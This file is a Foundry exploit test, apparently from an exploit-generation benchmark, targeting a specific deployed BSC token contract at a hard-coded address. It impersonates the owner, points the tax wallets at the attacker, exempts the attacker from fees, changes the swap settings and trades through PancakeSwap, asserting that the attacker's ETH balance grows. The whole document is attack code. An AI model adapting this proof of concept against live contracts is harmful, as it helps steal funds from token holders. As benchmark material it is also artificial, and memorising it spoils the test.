contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7;
    address attacker = address(this);
    address owner;
    IRouter02 router;
    Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7 token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner and prepare the attack
        token = Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET);
        owner = token.getOwner();
        vm.label(owner, "Original Owner");
        vm.label(address(this), "Attacker");

        // Give ourselves some ETH to work with
        deal(address(this), 10 ether);

        // We'll need the router for trading
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap Router BSC
        router = IRouter02(routerAddress);
        vm.label(routerAddress, "PancakeSwap Router");

        // Get the LP pair address
        address lpPair = token.lpPair();
        vm.label(lpPair, "LP Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;
        console.log("Initial attacker balance:", initialBalance);

        // Get token contract
        Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7 token = Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET);

        // Check contract state
        uint256 contractTokenBalance = token.balanceOf(TARGET);
        uint256 contractEthBalance = TARGET.balance;
        console.log("Contract token balance:", contractTokenBalance);
        console.log("Contract ETH balance:", contractEthBalance);

        // Check if trading is enabled
        bool trading = token.tradingEnabled();
        console.log("Trading enabled:", trading);

        // Check swap threshold
        // From code: swapThreshold = (_tTotal * 5) / 10000
        // We need to trigger swap if contractTokenBalance >= swapThreshold

        // Step 1: Impersonate owner to change wallets
        vm.startPrank(owner);

        // Change tax wallets to attacker address
        token.setWallets(payable(address(this)), payable(address(this)));
        console.log("Tax wallets changed to attacker");

        // Also exclude ourselves from fees
        token.setExcludedFromFees(address(this), true);
        console.log("Excluded from fees");

        // Enable contract swapping if not already enabled
        token.setContractSwapEnabled(true);
        console.log("Contract swap enabled");

        // Set swap timer to 0 to allow immediate swapping
        token.setSwapSettings(5, 10000, 10, 10000, 0);
        console.log("Swap settings updated");

        vm.stopPrank();

        // Step 2: Try to trigger contract swap if there are enough tokens
        if (contractTokenBalance > 0) {
            console.log("Attempting to trigger contract swap...");

            // We need to trigger a sell to make contract swap
            // First, get some tokens to sell
            address[] memory path = new address[](2);
            path[0] = router.WETH();
            path[1] = TARGET;

            // Buy small amount of tokens
            router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.01 ether}(
                0,
                path,
                address(this),
                block.timestamp
            );

            // Now sell to trigger contract swap
            uint256 tokenBalance = token.balanceOf(address(this));
            token.approve(address(router), tokenBalance);

            path[0] = TARGET;
            path[1] = router.WETH();

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenBalance,
                0,
                path,
                address(this),
                block.timestamp
            );

            console.log("Trade executed to trigger contract swap");
        }

        // Step 3: Check if we received any ETH
        uint256 finalBalance = address(this).balance;
        console.log("Final attacker balance:", finalBalance);

        // The oracle checks if balance increased
        assertGt(finalBalance, initialBalance, "Balance should increase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

